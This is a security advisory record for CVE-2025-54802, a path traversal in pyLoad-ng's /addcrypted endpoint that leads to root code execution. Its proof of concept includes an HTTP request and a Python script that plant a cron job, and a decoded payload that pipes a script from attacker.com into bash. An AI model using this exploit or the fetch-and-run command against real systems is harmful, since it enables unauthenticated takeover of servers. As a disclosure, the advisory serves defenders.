advisory_id: GHSA-48rp-jc79-2264
datasource_id: github_osv_importer_v2/GHSA-48rp-jc79-2264
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-48rp-jc79-2264/GHSA-48rp-jc79-2264.json
aliases:
  - CVE-2025-54802
summary: "pyLoad CNL Blueprint allows Path Traversal through `dlc_path` which leads to Remote\
  \ Code Execution (RCE)\n### Summary\n**Path Traversal in pyLoad-ng CNL Blueprint via `package`\
  \ parameter allows Arbitrary File Write leading to Remote Code Execution (RCE)** The `addcrypted`\
  \ endpoint in `pyload-ng` suffers from an unsafe path construction vulnerability, allowing\
  \ unauthenticated attackers to write arbitrary files outside the designated storage directory.\
  \ This can be abused to overwrite critical system files, including cron jobs and systemd services,\
  \ leading to privilege escalation and remote code execution as root.\n\n\n\n### Details\n\
  * **Endpoint**: `POST /addcrypted`\n* **Issue**: `src/pyload/webui/app/blueprints/cnl_blueprint.py`\n\
  \n#### Vulnerable Code\n```python\n dlc_path = os.path.join( \n     dl_path, package.replace(\"\
  /\", \"\").replace(\"\\\\\", \"\").replace(\":\", \"\") + \".dlc\" \n ) \n dlc = flask.request.form[\"\
  crypted\"].replace(\" \", \"+\") \n with open(dlc_path, mode=\"wb\") as fp: \n```\n\n### PoC\n\
  ```http\nPOST /addcrypted HTTP/1.1\nHost: localhost:8000\nContent-Type: application/x-www-form-urlencoded\n\
  Content-Length: 107\n\npackage=../../../../etc/cron.d/payload&crypted=KioqICogKiAqKiByb290IGN1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9yLnNoIHwgYmFzaA==\n\
  ```\n\nDecoded payload:\n```bash\n* * * * * root curl -s http://attacker.com/r.sh | bash\n\
  ```\n\n**Send crafted POST**\n```python\nimport requests, base64\n\npayload = \"* * * * *\
  \ root curl http://attacker.com/rev.sh | bash\"\nb64 = base64.b64encode(payload.encode()).decode()\n\
  \nrequests.post(\"http://localhost:8000/addcrypted\", data={\n    \"package\": \"../../../../etc/cron.d/exploit\"\
  ,\n    \"crypted\": b64\n})\n```\n\n\n### Impact\nThe vulnerability allows unauthenticated\
  \ attackers to write arbitrary files outside the intended directory via a path traversal flaw\
  \ in the `addcrypted` endpoint in `pyload-ng` parameter. when exploited, it enables remote\
  \ code execution as **root** by injecting malicious cron jobs or system files, turning a simple\
  \ file upload endpoint into a full system compromise vector."
impacted_packages:
  - purl: pkg:pypi/pyload-ng
    affected_versions: vers:pypi/<=0.5.0b3.dev89
    fixed_versions: vers:pypi/0.5.0b3.dev90
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.8'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-48rp-jc79-2264/GHSA-48rp-jc79-2264.json
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-22
references:
  - url: https://github.com/pyload/pyload
    reference_type:
    reference_id:
  - url: https://github.com/pyload/pyload/commit/70a44fe02c03bce92337b5d370d2a45caa4de3d4
    reference_type:
    reference_id:
  - url: https://github.com/pyload/pyload/pull/4596
    reference_type:
    reference_id:
  - url: https://github.com/pyload/pyload/security/advisories/GHSA-48rp-jc79-2264
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-54802
    reference_type:
    reference_id: CVE-2025-54802
